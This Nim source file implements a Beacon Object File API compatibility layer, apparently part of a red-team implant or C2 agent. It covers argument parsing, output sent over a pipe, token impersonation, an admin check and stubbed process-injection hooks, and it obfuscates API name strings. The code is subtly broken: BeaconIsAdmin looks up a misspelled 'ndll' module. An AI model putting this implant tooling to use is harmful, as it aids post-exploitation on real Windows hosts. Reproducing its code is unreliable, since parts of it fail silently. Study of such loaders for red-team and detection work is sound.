import winim/lean
import ./utils

#[
    References: 
    - https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h
    - https://github.com/frkngksl/NiCOFF/blob/main/BeaconFunctions.nim 
    - https://github.com/trustedsec/COFFLoader/blob/main/beacon_compatibility.c
    - https://github.com/Cracked5pider/CoffeeLdr/blob/main/Source/BeaconApi.c   
]#

const
    CALLBACK_OUTPUT*      = 0x0
    CALLBACK_OUTPUT_OEM*  = 0x1e
    CALLBACK_ERROR*       = 0x0d
    CALLBACK_OUTPUT_UTF8* = 0x20

type
    datap* {.bycopy, packed.} = object
        original*: PCHAR
        buffer*: PCHAR
        length*: int32
        size*: int32

    formatp* {.bycopy, packed.} = object
        original*: PCHAR
        buffer*: PCHAR
        length*: int32
        size*: int32

# va_list support for varargs
# Reference: https://forum.nim-lang.org/t/7352
type va_list* {.importc: "va_list", header: "<stdarg.h>".} = object
proc va_start(ap: va_list, last: pointer) {.importc, header: "<stdarg.h>".}
proc va_end(ap: va_list) {.importc, header: "<stdarg.h>".}
proc vsnprintf(s: cstring, maxlen: csize_t, format: cstring, arg: va_list): cint {.importc, header: "<stdio.h>".}

proc strcmp*(a, b: cstring): cint {.importc, header: "<string.h>".}
proc strncmp*(a, b: cstring, n: csize_t): cint {.importc, header: "<string.h>".}
proc strlen*(s: cstring): csize_t {.importc, header: "<string.h>".}

proc swapEndianess(indata: uint32): uint32 =
    var testInt: uint32 = 0xaabbccdd'u32
    var outInt: uint32 = indata
    if cast[ptr uint8](addr testInt)[] == 0xdd:
        let src = cast[uint](addr indata)
        let dst = cast[uint](addr outInt)
        cast[ptr uint8](dst + 0)[] = cast[ptr uint8](src + 3)[]
        cast[ptr uint8](dst + 1)[] = cast[ptr uint8](src + 2)[]
        cast[ptr uint8](dst + 2)[] = cast[ptr uint8](src + 1)[]
        cast[ptr uint8](dst + 3)[] = cast[ptr uint8](src + 0)[]
    return outInt

#[
    Async BOF
]#
var gOutputPipe*: HANDLE = 0  
var gWakeupEvent*: HANDLE = 0
var gStopEvent*: HANDLE = 0

proc BeaconWakeup*() {.stdcall.} = 
    if gWakeupEvent != 0:
        discard SetEvent(gWakeupEvent)

proc BeaconGetStopJobEvent(): HANDLE {.stdcall.} = 
    return gStopEvent

#[
    Parsing Functions
]#
proc BeaconDataParse(parser: ptr datap, buffer: PCHAR, size: int): void {.stdcall.} =
    if parser == nil or buffer == nil:
        return

    parser.original = buffer
    parser.buffer = buffer
    parser.length = int32(size - 4)
    parser.size = int32(size - 4)
    parser.buffer = cast[PCHAR](cast[uint](parser.buffer) + 4)

proc BeaconDataPtr(parser: ptr datap, size: int): PCHAR {.stdcall.} =
    if parser == nil:
        return NULL
    
    if parser.length < int32(size):
        return NULL
    
    let outData = parser.buffer
    parser.buffer = cast[PCHAR](cast[uint](parser.buffer) + uint(size))
    parser.length -= int32(size)
    return outData

proc BeaconDataInt(parser: ptr datap): int {.stdcall.} =
    if parser == nil:
        return 0

    var fourbyteint: int32 = 0
    if parser.length < 4:
        return 0
    
    copyMem(addr fourbyteint, parser.buffer, 4)
    parser.buffer = cast[PCHAR](cast[uint](parser.buffer) + 4)
    parser.length -= 4
    return int(fourbyteint)

proc BeaconDataShort(parser: ptr datap): int16 {.stdcall.} =
    if parser == nil:
        return 0

    var retvalue: int16 = 0
    if parser.length < 2:
        return 0

    copyMem(addr retvalue, parser.buffer, 2)
    parser.buffer = cast[PCHAR](cast[uint](parser.buffer) + 2)
    parser.length -= 2
    return retvalue

proc BeaconDataLength(parser: ptr datap): int {.stdcall.} =
    if parser == nil:
        return 0
    
    return int(parser.length)

proc BeaconDataExtract(parser: ptr datap, size: ptr int): PCHAR {.stdcall.} =
    if parser == nil:
        return NULL

    var 
        length: uint32 = 0
        outData: PCHAR = nil
    
    if parser.length < 4:
        return NULL
    
    copyMem(addr length, parser.buffer, 4)
    parser.buffer = cast[PCHAR](cast[uint](parser.buffer) + 4)
    parser.length -= 4

    outData = parser.buffer
    if outData == nil:
        return NULL

    parser.length -= int32(length)
    parser.buffer = cast[PCHAR](cast[uint](parser.buffer) + uint(length))

    if size != nil and outData != nil:
        size[] = int(length)
    
    return outData

#[
    Formatting Functions
]#
proc BeaconFormatAlloc(format: ptr formatp, maxsz: int): void {.stdcall.} =
    if format == nil:
        return

    format.original = cast[PCHAR](HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxsz))
    format.buffer = format.original
    format.length = 0
    format.size = int32(maxsz)

proc BeaconFormatReset(format: ptr formatp): void {.stdcall.} =
    if format == nil:
        return

    zeroMem(format.original, format.size)
    format.buffer = format.original
    format.length = 0

proc BeaconFormatFree(format: ptr formatp): void {.stdcall.} =
    if format == nil:
        return

    if format.original != nil:
        discard HeapFree(GetProcessHeap(), 0, format.original)
        format.original = nil
    
    format.buffer = nil
    format.length = 0
    format.size = 0

proc BeaconFormatAppend(format: ptr formatp, text: PCHAR, len: int): void {.stdcall.} =
    if format == nil or text == nil:
        return

    if format.length + int32(len) > format.size:
        return

    copyMem(format.buffer, text, len)
    format.buffer = cast[PCHAR](cast[uint](format.buffer) + uint(len))
    format.length += int32(len)

proc BeaconFormatPrintf(format: ptr formatp, fmt: PCHAR): void {.stdcall, varargs.} =
    if format == nil or fmt == nil:
        return
    
    var args: va_list
    var length: cint = 0

    va_start(args, fmt)
    length = vsnprintf(nil, 0, fmt, args)
    va_end(args)
    
    if length <= 0:
        return

    if format.length + length > format.size:
        return

    va_start(args, fmt)
    discard vsnprintf(format.buffer, csize_t(length + 1), fmt, args)
    va_end(args)
    
    format.length += length
    format.buffer = cast[PCHAR](cast[uint](format.buffer) + uint(length))

proc BeaconFormatToString(format: ptr formatp, size: ptr int): PCHAR {.stdcall.} =
    if format == nil:
        return NULL
    if size != nil:
        size[] = int(format.length)
    return format.original

proc BeaconFormatInt(format: ptr formatp, value: int): void {.stdcall.} =
    if format == nil:
        return

    var indata: uint32 = cast[uint32](value)
    var outdata: uint32 = 0
    
    if format.length + 4 > format.size:
        return
        
    outdata = swapEndianess(indata)
    copyMem(format.buffer, addr outdata, 4)
    format.length += 4
    format.buffer = cast[PCHAR](cast[uint](format.buffer) + 4)

#[ 
    Output Functions
]#
proc BeaconPrintf*(typeArg: int, fmt: PCHAR): void {.stdcall, varargs.} =
    if fmt == nil or gOutputPipe == 0:
        return

    var length: cint = 0
    var args: va_list

    va_start(args, fmt)
    length = vsnprintf(nil, 0, fmt, args)
    va_end(args)

    if length <= 0:
        return

    var tmpOutput = cast[PCHAR](HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, length + 1))
    if tmpOutput == nil:
        return

    va_start(args, fmt)
    discard vsnprintf(tmpOutput, csize_t(length + 1), fmt, args)
    va_end(args)

    var bytesWritten: DWORD = 0
    discard WriteFile(gOutputPipe, tmpOutput, DWORD(length), addr bytesWritten, nil)
    discard HeapFree(GetProcessHeap(), 0, tmpOutput)

proc BeaconOutput(typeArg: int, data: PCHAR, len: int): void {.stdcall.} =
    if data == nil or gOutputPipe == 0:
        return

    var bytesWritten: DWORD = 0
    discard WriteFile(gOutputPipe, data, DWORD(len), addr bytesWritten, nil)

proc BeaconDownload(filename: PCHAR, buffer: PCHAR, length: uint): BOOL {.stdcall.} =
    return FALSE

#[
    Token Functions
]#
proc BeaconUseToken(token: HANDLE): BOOL {.stdcall.} =
    if ImpersonateLoggedOnUser(token) == 0: return FALSE
    return TRUE

proc BeaconRevertToken(): void {.stdcall.} =
    discard RevertToSelf()

type 
    NtQueryInformationToken = proc(hToken: HANDLE, tokenInformationClass: TOKEN_INFORMATION_CLASS, tokenInformation: PVOID, tokenInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
    NtOpenThreadToken = proc(threadHandle: HANDLE, desiredAccess: ACCESS_MASK, openAsSelf: BOOLEAN, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
    NtOpenProcessToken = proc(processHandle: HANDLE, desiredAccess: ACCESS_MASK, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}

proc BeaconIsAdmin(): BOOL {.stdcall.}=
    let 
        hNtdll = GetModuleHandleA("ndll")
        pNtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, "NtOpenProcessToken"))
        pNtOpenThreadToken = cast[NtOpenThreadToken](GetProcAddress(hNtdll, "NtOpenThreadToken"))
        pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(hNtdll, "NtQueryInformationToken"))
    
    var 
        status: NTSTATUS = 0
        hToken: HANDLE 
        returnLength: ULONG = 0
        pElevation: TOKEN_ELEVATION 

    # https://ntdoc.m417z.com/ntopenthreadtoken
    status = pNtOpenThreadToken(cast[HANDLE](-2), TOKEN_QUERY, TRUE, addr hToken)
    if status != STATUS_SUCCESS:
        status = pNtOpenProcessToken(cast[HANDLE](-1), TOKEN_QUERY, addr hToken)
        if status != STATUS_SUCCESS: 
            return FALSE
        
    # Get elevation
    status = pNtQueryInformationToken(hToken, tokenElevation, addr pElevation, cast[ULONG](sizeof(pElevation)), addr returnLength)
    if status != STATUS_SUCCESS: 
        return FALSE

    return cast[bool](pElevation.TokenIsElevated)

#[ 
    Spawn+Inject Functions
]# 
proc BeaconGetSpawnTo(x86: BOOL, buffer: PCHAR, length: int): void {.stdcall.} =
    return

proc BeaconSpawnTemporaryProcess(x86: BOOL, ignoreToken: BOOL, sInfo: ptr STARTUPINFOA, pInfo: ptr PROCESS_INFORMATION): BOOL {.stdcall.} =
    return FALSE

proc BeaconInjectProcess(hProc: HANDLE, pid: int, payload: PCHAR, p_len: int, p_offset: int, arg: PCHAR, a_len: int): void {.stdcall.} =
    return

proc BeaconInjectTemporaryProcess(pInfo: ptr PROCESS_INFORMATION, payload: PCHAR, p_len: int, p_offset: int, arg: PCHAR, a_len: int): void {.stdcall.} =
    return

proc BeaconCleanupProcess(pInfo: ptr PROCESS_INFORMATION): void {.stdcall.} =
    if pInfo != nil:
        discard CloseHandle(pInfo.hThread)
        discard CloseHandle(pInfo.hProcess)

#[
    Utility Functions
]# 
proc toWideChar(src: PCHAR, dst: PWSTR, max: int): BOOL {.stdcall.} =
    if max < sizeof(WCHAR):
        return FALSE
    return if MultiByteToWideChar(CP_ACP, 0, src, -1, dst, int32(max div sizeof(WCHAR))) != 0: TRUE else: FALSE


#[
    Data Storage Functions
]#
const MAX_STORAGE = 64
const KEY_LENGTH = 64
type BeaconStorageEntry = object
    key:   array[KEY_LENGTH, char]
    value: PVOID
    used:  bool

var beaconStorage: array[MAX_STORAGE, BeaconStorageEntry]

proc BeaconAddValue*(key: PCHAR, value: PVOID): BOOL {.stdcall.} =
    if key == nil: return FALSE
    let keyLen = int(strlen(key))
    if keyLen >= KEY_LENGTH: return FALSE
    for i in 0 ..< MAX_STORAGE:
        if not beaconStorage[i].used or strcmp(cast[cstring](addr beaconStorage[i].key[0]), key) == 0:
            zeroMem(addr beaconStorage[i].key[0], KEY_LENGTH)
            copyMem(addr beaconStorage[i].key[0], key, keyLen)
            beaconStorage[i].value = value
            beaconStorage[i].used  = true
            return TRUE
    return FALSE

proc BeaconGetValue*(key: PCHAR): PVOID {.stdcall.} =
    if key == nil: return nil
    for i in 0 ..< MAX_STORAGE:
        if beaconStorage[i].used and strcmp(cast[cstring](addr beaconStorage[i].key[0]), key) == 0:
            return beaconStorage[i].value
    return nil

proc BeaconRemoveValue*(key: PCHAR): BOOL {.stdcall.} =
    if key == nil: return FALSE
    for i in 0 ..< MAX_STORAGE:
        if beaconStorage[i].used and strcmp(cast[cstring](addr beaconStorage[i].key[0]), key) == 0:
            zeroMem(addr beaconStorage[i], sizeof(BeaconStorageEntry))
            return TRUE
    return FALSE

var beaconApiAddresses*: array[34, tuple[name: string, address: PVOID]] = [
    (protect("BeaconWakeup"), BeaconWakeup),
    (protect("BeaconGetStopJobEvent"), BeaconGetStopJobEvent),
    (protect("BeaconDataParse"), BeaconDataParse),
    (protect("BeaconDataPtr"), BeaconDataPtr),
    (protect("BeaconDataInt"), BeaconDataInt),
    (protect("BeaconDataShort"), BeaconDataShort),
    (protect("BeaconDataLength"), BeaconDataLength),
    (protect("BeaconDataExtract"), BeaconDataExtract),
    (protect("BeaconFormatAlloc"), BeaconFormatAlloc),
    (protect("BeaconFormatReset"), BeaconFormatReset),
    (protect("BeaconFormatFree"), BeaconFormatFree),
    (protect("BeaconFormatAppend"), BeaconFormatAppend),
    (protect("BeaconFormatPrintf"), BeaconFormatPrintf),
    (protect("BeaconFormatToString"), BeaconFormatToString),
    (protect("BeaconFormatInt"), BeaconFormatInt),
    (protect("BeaconPrintf"), BeaconPrintf),
    (protect("BeaconOutput"), BeaconOutput),
    (protect("BeaconDownload"), BeaconDownload),
    (protect("BeaconUseToken"), BeaconUseToken),
    (protect("BeaconRevertToken"), BeaconRevertToken),
    (protect("BeaconIsAdmin"), BeaconIsAdmin),
    (protect("BeaconGetSpawnTo"), BeaconGetSpawnTo),
    (protect("BeaconSpawnTemporaryProcess"), BeaconSpawnTemporaryProcess),
    (protect("BeaconInjectProcess"), BeaconInjectProcess),
    (protect("BeaconInjectTemporaryProcess"), BeaconInjectTemporaryProcess),
    (protect("BeaconCleanupProcess"), BeaconCleanupProcess),
    (protect("toWideChar"), toWideChar),
    (protect("BeaconAddValue"), BeaconAddValue),
    (protect("BeaconGetValue"), BeaconGetValue),
    (protect("BeaconRemoveValue"), BeaconRemoveValue),
    (protect("LoadLibraryA"), LoadLibraryA),
    (protect("GetProcAddress"), GetProcAddress),
    (protect("GetModuleHandleA"), GetModuleHandleA),
    (protect("FreeLibrary"), FreeLibrary)
]